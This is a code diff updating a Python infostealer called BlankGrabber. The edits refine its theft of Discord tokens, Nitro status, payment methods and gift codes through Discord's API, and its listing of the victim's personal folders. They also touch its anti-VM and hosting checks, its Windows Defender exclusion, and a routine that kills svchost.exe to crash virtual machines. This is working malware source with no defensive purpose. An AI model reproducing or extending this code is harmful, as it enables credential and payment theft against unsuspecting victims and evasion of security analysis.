@@ -172,9 +172,11 @@ class utils:
         def newfunc(*args, **kwargs):
             try:
                 return func(*args, **kwargs)
-            except Exception as e:
-                trb = traceback.extract_tb(sys.exc_info()[2])[-1]
-                utils.ERRORLOGS.append(f"Line {trb[1]} : {trb[2]} : {e.__class__.__name__} : {e}")
+            except Exception:
+                # trb = traceback.extract_tb(sys.exc_info()[2])[-1]
+                # utils.ERRORLOGS.append(f"Line {trb[1]} : {trb[2]} : {e.__class__.__name__} : {e}")
+                trb = traceback.format_exc()
+                utils.ERRORLOGS.append(trb)
         return newfunc
     
     @staticmethod
@@ -256,7 +258,7 @@ class vmprotect:
     @staticmethod
     def checkHosting() -> bool:
         http = urllib3.PoolManager()
-        return http.request('GET', 'http://ip-api.com/line/?fields=hosting').data.decode() == 'true'
+        return http.request('GET', 'http://ip-api.com/line/?fields=hosting').data.decode().strip() == 'true'
 
     @staticmethod
     def checkHTTPSimulation() -> bool:
@@ -645,6 +647,7 @@ class Discord:
                     2 : 'Nitro',
                     3 : 'Nitro Basic'
                 }
+
                 nitro_data = nitro_infos.get(nitro_type, '(Unknown)')
                 
 
@@ -652,16 +655,20 @@ class Discord:
                 if len(billing) == 0:
                     billing = '(No Payment Method)'
                 else:
-                    methods = list()
+                    methods = {
+                        'Card' : 0,
+                        'Paypal' : 0,
+                        'Unknown' : 0
+                    }
                     for m in billing:
                         method_type = m.get('type', 0)
                         if method_type == 0:
-                            methods.append('(Unknown)')
+                            methods['Unknown'] += 1
                         elif method_type == 1:
-                            methods.append('Card')
+                            methods['Card'] += 1
                         else:
-                            methods.append('Paypal')
-                    billing = ', '.join(methods)
+                            methods['Paypal'] += 1
+                    billing = ', '.join(['{} ({})'.format(name, quantity) for name, quantity in methods.items() if quantity != 0]) or 'None'
                 gifts = list()
                 r = Discord.http.request('GET', 'https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers= Discord.getHeaders(token)).data.decode()
                 if 'code' in r:
@@ -754,7 +761,7 @@ class BlankGrabber:
     def errReport(self) -> None:
         if utils.ERRORLOGS:
             with open(os.path.join(self.tempfolder, 'Error Logs.txt'), 'w') as file:
-                file.write('\n'.join(utils.ERRORLOGS))
+                file.write('\n--------------------------------------------------------------------------\n'.join(utils.ERRORLOGS))
     
     def cleanUp(self) -> None:
         if os.path.isdir(self.tempfolder):
@@ -938,6 +945,7 @@ class BlankGrabber:
     
     @utils.catch
     def getIPandSystemInfo(self) -> None:
+        self.ipinfo = "(Unable to get IP info)"
         try:
             r = json.loads(self.http.request("GET", "http://ip-api.com/json/?fields=225545").data.decode())
             if r.get("status") != "success":
@@ -956,6 +964,8 @@ class BlankGrabber:
             output = {}
             for location in ['Desktop', 'Documents' , 'Downloads', 'Music', 'Pictures', 'Videos']:
                 location = os.path.join(os.getenv('userprofile'), location)
+                if not os.path.isdir(location):
+                    continue
                 dircontent = os.listdir(location)
                 dircontent.remove('desktop.ini')
                 if dircontent:
@@ -1140,10 +1150,10 @@ if __name__ == '__main__':
     system.WDexclude(MEIPASS)
     while not system.isConnected():
         time.sleep(900)
-    if VMPROTECT and not system.isInStartup():
+    if VMPROTECT:
         isVM = vmprotect.checkVM()
         if isVM:
-            if BSOD:
+            if BSOD and not system.isInStartup():
                 for i in ('svchost.exe', 'winnit.exe'):
                     subprocess.run(f'taskkill /F /IM {i}', shell= True, capture_output= True)
             os._exit(1)
